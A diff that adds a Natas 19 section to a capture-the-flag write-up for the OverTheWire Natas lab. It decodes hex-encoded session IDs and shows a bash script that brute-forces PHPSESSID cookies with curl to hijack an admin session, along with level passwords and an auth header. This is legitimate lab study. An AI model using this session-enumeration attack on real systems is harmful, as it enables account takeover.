@@ -802,3 +802,88 @@ Attempt with 118 failed
 Succeeded with 119:
  You are an admin. The credentials for the next level are:<br><pre>Username: natas19 Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a hre </html>-source.html">View sourcecode</a></div>
 ```
+
+## Natas 19 - John Nash Nazaré - seeing patterns
+
+Natas19 is a slightly more complex variant of Natas18. It begins by stating:
+
+> This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+
+And there is no `view source` button. Button we can assume that all is the same with the exception of the session id.
+
+That said, my next step was to poke around and try and catch a glimpse of how the session ids are defined.
+
+Logging in with username and pass testing, foobar (respectively), I got:
+
+```
+36342d74657374696e67
+3333352d74657374696e67
+3335372d74657374696e67
+3538352d74657374696e67
+3535342d74657374696e67
+3130332d74657374696e67
+37372d74657374696e67
+3333352d74657374696e67
+```
+
+A couple of things to note here: there is an invariant suffix: `2d74657374696e67` and there was a repeated value `3333352d74657374696e67`.
+
+That tells us two things: 
+
+1. The varying part is not as broad as initially expected, and
+2. the space in which it all varies is also not that broad.
+
+However, the great insight here was noticing that all these look alot like ascii... so I attempted unpacking these as if they were ascii hex numbers, et voila:
+
+```
+perl -e 'print unpack("A*", "\x33\x33\x35\x2d\x74\x65\x73\x74\x69\x6e\x67");'                                                         1.97G RAM 
+335-testing
+```
+
+My immediate thought was: ok, busted, it's exactly the same as the Natas18, with the same 640 rand ids, this time concatenated with `-username` and `| xxd -p`.
+
+To validate, I tried logging in with username pass admin, foobar, got the cookie and:
+
+```
+printf '559-admin'|xxd -p                                                                                                             1.98G RAM 
+3535392d61646d696e
+```
+
+Which matched.
+
+So, enough chit-chat, to the Batmobile!
+
+This is the same code as Natas18, with these only differences:
+
+```diff
+--- ../natas18/highjacker.sh    2020-04-10 16:48:59.000000000 -0300
++++ highjacker.sh       2020-04-10 17:46:33.000000000 -0300
+@@ -6,11 +6,12 @@
+ 
+ while [[ $pwned = 0 ]]; do
+   if [[ $num = 640 ]]; then pwned=1; fi
++  hexnum=$(printf "$num-admin" | xxd -p)
+ 
+-  RESPONSE=$(curl 'http://natas18.natas.labs.overthewire.org/index.php' \
+-    -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
+-    -H 'Referer: http://natas18.natas.labs.overthewire.org/' \
+-    -H "Cookie: PHPSESSID=$num" \
++  RESPONSE=$(curl 'http://natas19.natas.labs.overthewire.org/index.php' \
++    -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' \
++    -H 'Referer: http://natas19.natas.labs.overthewire.org/' \
++    -H "Cookie: PHPSESSID=$hexnum" \
+     --silent \
+     --data 'username=admin&password=asdfasdf')
+```
+
+And like so:
+
+```
+...
+Attempt with 277 failed
+Attempt with 278 failed
+Attempt with 279 failed
+Attempt with 280 failed
+Succeeded with 281:
+ </html> an admin. The credentials for the next level are:<br><pre>Username: natas20 Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>script>
+```
